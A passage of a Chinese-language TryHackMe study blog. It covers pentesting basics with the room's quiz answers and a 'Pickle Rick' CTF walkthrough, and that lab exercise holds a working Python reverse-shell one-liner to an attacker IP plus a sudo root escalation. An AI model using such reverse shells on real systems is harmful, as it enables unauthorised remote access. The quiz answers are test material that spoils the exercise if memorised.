例如，某人关闭一个欺诈网站。</span><br><span class="line">黑帽黑客	这些人是罪犯，通常试图破坏组织或以牺牲他人为代价获得某种形式的经济利益。	例如，勒索软件作者通过恶意代码感染设备，并以数据作为赎金。</span><br><span class="line"></span><br><span class="line">战斗规则（ROE）</span><br><span class="line"></span><br><span class="line">ROE是渗透测试任务开始时制定的文件。这个文件由三个主要部分组成（在下表中解释），最终负责决定任务的进行方式。SANS学院在网上提供了这个文件的一个很好的例子，您可以在这里查看。</span><br><span class="line"></span><br><span class="line">部分	描述</span><br><span class="line">权限	这部分文件明确允许任务的进行。这一授权对于法律上保护个人和组织进行的活动至关重要。</span><br><span class="line">测试范围	这部分文件将标注具体的目标，适用于任务的范围。例如，渗透测试可能仅适用于特定的服务器或应用程序，而不是整个网络。</span><br><span class="line">规则	规则部分将定义任务期间允许的具体技术。例如，规则可能明确规定诸如网络钓鱼攻击之类的技术是被禁止的，但中间人攻击是可以的。</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p>You are given permission to perform a security audit on an organisation; what type of hacker would you be?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">White Hat</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>You attack an organisation and steal their data, what type of hacker would you be?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Black Hat</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>What document defines how a penetration testing engagement should be carried out?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rules of Engagement</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Penetration-Testing-Methodologies">Penetration Testing Methodologies</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">渗透测试可以有多种不同的目标和范围。由于这一点，没有两个渗透测试是相同的，也没有一套方法适用于所有情况。</span><br><span class="line"></span><br><span class="line">渗透测试人员在执行任务时采取的步骤称为方法论。一个实用的方法论是明智的，其中采取的步骤与手头的情况相关。例如，在测试网络安全性时使用的方法论在测试网络安全性时并不实用。</span><br><span class="line"></span><br><span class="line">在讨论一些不同的行业标准方法论之前，我们应该注意，所有这些方法都有以下阶段的一般主题：</span><br><span class="line"></span><br><span class="line">阶段	描述</span><br><span class="line">信息收集	这个阶段涉及尽可能收集有关目标/组织的所有公开可访问信息，例如OSINT和研究。</span><br><span class="line"></span><br><span class="line">注意：这不涉及扫描任何系统。</span><br><span class="line">枚举/扫描	这个阶段涉及发现系统上运行的应用程序和服务。例如，发现一个可能存在漏洞的Web服务器。</span><br><span class="line">利用	这个阶段涉及利用发现的系统或应用程序中的漏洞。这个阶段可能涉及使用公开的漏洞或利用应用程序逻辑。</span><br><span class="line">权限提升	一旦成功利用了系统或应用程序（称为立足点），这个阶段就是试图扩展对系统的访问。您可以横向和纵向提升权限，横向是访问同一权限组的另一个帐户（例如，另一个用户），而纵向是访问另一个权限组的帐户（例如，管理员）。</span><br><span class="line">后渗透	这个阶段涉及几个子阶段：</span><br><span class="line"></span><br><span class="line">1. 可以针对哪些其他主机（枢轴）</span><br><span class="line"></span><br><span class="line">2. 由于我们是特权用户，我们可以从主机中获取哪些附加信息</span><br><span class="line"></span><br><span class="line">3.  遮掩你的踪迹</span><br><span class="line"></span><br><span class="line">4. 报告</span><br><span class="line"></span><br><span class="line">OSSTMM</span><br><span class="line"></span><br><span class="line">开放源安全测试方法手册为系统、软件、应用程序、通信和网络安全的测试策略提供了详细的框架。</span><br><span class="line"></span><br><span class="line">该方法主要关注这些系统、应用程序的通信方式，因此包括了：</span><br><span class="line"></span><br><span class="line">电信（电话、VoIP等）</span><br><span class="line">有线网络</span><br><span class="line">无线通信</span><br><span class="line">优点	缺点</span><br><span class="line">深入涵盖了各种测试策略。</span><br><span class="line">该框架难以理解，非常详细，并倾向于使用独特的定义。</span><br><span class="line">包括特定目标的测试策略（例如，电信和网络）</span><br><span class="line">故意留空。</span><br><span class="line">该框架根据组织的需求具有灵活性。</span><br><span class="line">故意留空。</span><br><span class="line">该框架旨在为系统和应用程序建立标准，这意味着可以在渗透测试场景中使用通用方法。</span><br><span class="line">故意留空。</span><br><span class="line"></span><br><span class="line">OWASP</span><br><span class="line"></span><br><span class="line">“开放式Web应用程序安全项目”框架是一个社区驱动且经常更新的框架，专门用于测试Web应用程序和服务的安全性。</span><br><span class="line"></span><br><span class="line">该基金会定期撰写报告，说明Web应用程序可能存在的十大安全漏洞，测试方法和纠正措施。</span><br><span class="line"></span><br><span class="line">优点	缺点</span><br><span class="line">易于学习和理解。	可能不清楚Web应用程序具有哪种类型的漏洞（它们通常会重叠）。</span><br><span class="line">积极维护并经常更新。</span><br><span class="line">OWASP不会建议任何特定的软件开发生命周期。</span><br><span class="line">涵盖了从测试到报告和纠正的所有阶段。</span><br><span class="line">该框架不具备任何类似CHECK的认证。</span><br><span class="line">专注于Web应用程序和服务。</span><br><span class="line">故意留空。</span><br><span class="line"></span><br><span class="line">NIST网络安全框架1.1</span><br><span class="line"></span><br><span class="line">NIST网络安全框架是一种流行的框架，用于提高组织的网络安全标准并管理网络威胁的风险。这个框架由于其流行度和详细程度而成为一种值得一提的方法。</span><br><span class="line"></span><br><span class="line">该框架为组织从关键基础设施（发电厂等）到商业的安全控制和成功基准提供了指南。 对渗透测试人员应采取的方法没有一个标准指南。</span><br><span class="line"></span><br><span class="line">优点	缺点</span><br><span class="line">据估计，到2020年，50%的美国组织将使用NIST框架。</span><br><span class="line">NIST有许多不同版本的框架，因此可能难</span><br><span class="line"></span><br><span class="line">以确定哪一个适用于您的组织。</span><br><span class="line">该框架在制定标准方面非常详细，以帮助组织减轻网络威胁带来的威胁。</span><br><span class="line">NIST框架的审计政策较弱，难以确定发生了什么样的违规行为。</span><br><span class="line">该框架经常进行更新。</span><br><span class="line">该框架不考虑云计算，而云计算正在迅速变得越来越受组织欢迎。</span><br><span class="line">NIST为使用该框架的组织提供认证。</span><br><span class="line">故意留空。</span><br><span class="line">NIST框架旨在与其他框架一起实施。</span><br><span class="line">故意留空。</span><br><span class="line"></span><br><span class="line">NCSC CAF</span><br><span class="line"></span><br><span class="line">网络评估框架（CAF）是一个广泛的框架，包含14个原则，用于评估各种网络威胁以及组织对这些威胁的防御。</span><br><span class="line"></span><br><span class="line">该框架适用于被视为执行“至关重要的服务和活动”的组织，如关键基础设施、银行等。该框架主要关注和评估以下主题：</span><br><span class="line"></span><br><span class="line">数据安全</span><br><span class="line">系统安全</span><br><span class="line">身份和访问控制</span><br><span class="line">弹性</span><br><span class="line">监控</span><br><span class="line">响应和恢复规划</span><br><span class="line"></span><br><span class="line">优点	缺点</span><br><span class="line">这个框架得到了政府网络安全机构的支持。</span><br><span class="line">该框架在行业中仍然比较新，这意味着组织还没有足够的时间进行必要的改变以适应它。</span><br><span class="line">这个框架提供认证。</span><br><span class="line">该框架基于原则和思想，不像某些其他框架那样直接。</span><br><span class="line">这个框架涵盖了从安全到响应的十四个原则。</span><br><span class="line">故意留空。</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p>What stage of penetration testing involves using publicly available information?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Information Gathering</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>If you wanted to use a framework for pentesting telecommunications, what framework would you use? Note: We’re looking for the acronym here and not the full name.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OSSTMM</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>What framework focuses on the testing of web applications?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OWASP</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Black-box-White-box-Grey-box-Penetration-Testing">Black box, White box, Grey box Penetration Testing</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑盒测试</span><br><span class="line">这个测试过程是一个高级过程，测试人员不会获得关于应用程序或服务内部工作原理的任何信息。</span><br><span class="line">测试人员扮演普通用户的角色，测试应用程序或软件的功能和交互。这种测试可能涉及与界面进行交互，即按钮，并测试是否返回了预期的结果。对于这种类型的测试，不需要编程知识或对程序的理解。</span><br><span class="line">黑盒测试显著增加了在信息收集和枚举阶段花费的时间，以了解目标的攻击面。</span><br><span class="line"></span><br><span class="line">灰盒测试</span><br><span class="line">这个测试过程是最受欢迎的用于诸如渗透测试之类的事物。它是黑盒测试和白盒测试过程的结合体。测试人员对应用程序或软件的内部组件具有一些有限的知识，但他们会像黑盒场景一样与应用程序进行交互，然后利用他们对应用程序的了解来解决发现的问题。</span><br><span class="line">在灰盒测试中，提供的有限知识可以节省时间，并且通常被选择用于极为艰难的攻击面。</span><br><span class="line"></span><br><span class="line">白盒测试</span><br><span class="line">这个测试过程是一个低级过程，通常由了解编程和应用程序逻辑的软件开发人员执行。测试人员将测试应用程序或软件的内部组件，并确保特定功能能够正确地工作且在合理的时间内完成。</span><br><span class="line">测试人员将完全了解应用程序及其预期行为，并且比黑盒测试要耗费更多时间。在白盒测试场景中的完全了解提供了一种测试方法，可以验证整个攻击面。</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p>You are asked to test an application but are not given access to its source code - what testing process is this?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Black Box</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>You are asked to test a website, and you are given access to the source code - what testing process is this?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">White Box</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Practical-ACME-Penetration-Test">Practical: ACME Penetration Test</h3>
+<p>简单呈现了一个渗透测试的基础过程</p>
+<h2 id="Pickle-Rick">Pickle Rick</h2>
+<h3 id="前言">前言</h3>
+<p>一个简单靶场，kali环境有些小问题，这次是windows下做的</p>
+<p>A Rick and Morty CTF. Help turn Rick back into a human!</p>
+<h3 id="过程">过程</h3>
+<p>首先给出一个页面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Listen Morty... I need your help, I&#x27;ve turned myself into a pickle again and this time I can&#x27;t change back!</span><br><span class="line"></span><br><span class="line">I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!</span><br></pre></td></tr></table></figure>
+<p>很明显提示说使用burpsuite</p>
+<p>通过抓包得到一条提示信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Note to self, remember username!</span><br><span class="line">Username: R1ckRul3s</span><br></pre></td></tr></table></figure>
+<p>先使用扫描存在的端口，发现存在了两个开放端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024/2/23 23:27:09    开始扫描...</span><br><span class="line">10.10.242.108:22</span><br><span class="line">10.10.242.108:80</span><br></pre></td></tr></table></figure>
+<p>然后来扫一下目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login.php</span><br><span class="line">robots.txt</span><br></pre></td></tr></table></figure>
+<p>在robots.txt下发现存在字符串，当作密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Wubbalubbadubdub</span><br></pre></td></tr></table></figure>
+<p>login.php尝试登录，登陆后成功跳转portal.php</p>
+<p>存在一个可能是命令执行的窗口，ls后查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sup3rS3cretPickl3Ingred.txt</span><br><span class="line">assets</span><br><span class="line">clue.txt</span><br><span class="line">denied.php</span><br><span class="line">index.html</span><br><span class="line">login.php</span><br><span class="line">portal.php</span><br><span class="line">robots.txt</span><br></pre></td></tr></table></figure>
+<p>访问Sup3rS3cretPickl3Ingred.txt，得到第一个flag</p>
+<p>在clue.txt发现一段话</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Look around the file system for the other ingredient.</span><br></pre></td></tr></table></figure>
+<p>denied.php禁止访问</p>
+<p>开始反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.8.71.162 &quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/02/25/RbVJ34EyWQNHPaT.png" alt=""></p>
+<p>成功反弹后进行提权操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p>发现当前甚至没有设置基础密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for www-data on ip-10-10-242-108.eu-west-1.compute.internal:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on ip-10-10-242-108.eu-west-1.compute.internal:</span><br><span class="line">    (ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+<p>成功提权</p>
+<p>然后查找相应的两个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &quot;second ingredients&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/02/25/tmTeXNpjWKaqfEy.png" alt=""></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ./3rd.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/02/25/H7wTqBGDkIljEb8.png" alt=""></p>
 ]]></content>
       <categories>
         <category>Tryhackme</category>
